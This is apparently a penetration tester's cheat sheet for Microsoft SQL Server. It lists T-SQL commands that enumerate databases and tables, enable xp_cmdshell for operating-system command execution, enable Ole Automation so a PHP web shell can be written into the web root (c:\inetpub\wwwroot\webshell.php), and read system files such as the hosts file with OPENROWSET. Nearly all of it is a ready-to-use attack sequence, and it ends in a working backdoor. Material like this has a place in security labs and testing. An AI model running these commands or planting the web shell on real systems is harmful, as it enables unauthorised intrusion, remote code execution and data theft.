-- -
General commands you can use to enumerate the database and interact with it. References the [Microsoft Docs](https://learn.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) to move around. 
### Query DB
```mysql
# you need to first input the query, then execute a go command to actually run the query. go command must be in all lowercase.

# show databases
SELECT name FROM master.dbo.sysdatabases
go

# Select a database
USE <db> 
go

# Show tables
SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES
go

# select data from table 
SELECT * FROM <table>
go
```
### Command Execution
```mysql
xp_cmdshell '<cmd>'
go

xp_cmdshell 'whoami'
go

# xp_cmdshell is not enabled by default, so we can enable it as follows:
# allow advanced options to be changed
EXECUTE sp_configure 'show advanced options', 1
go

# update the currently configured balue for advanced options
RECONFIGURE
go

# enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1
go

# update current configured value for this feature
RECONFIGURE
go
```
### Create a File
#### Enable Ole Automation Procedures
This setting will need to be enabled to write a file to the system
```mysql
sp_configure 'show advanced options', 1
go
RECONFIGURE
go
sp_configure 'Ole Automation Procedures', 1
go
RECONFIGURE
go
```
#### Create the file
```mysql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
go
```
### Read File
Given the appropriate permissions:
```mysql
SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents
go

SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
go
```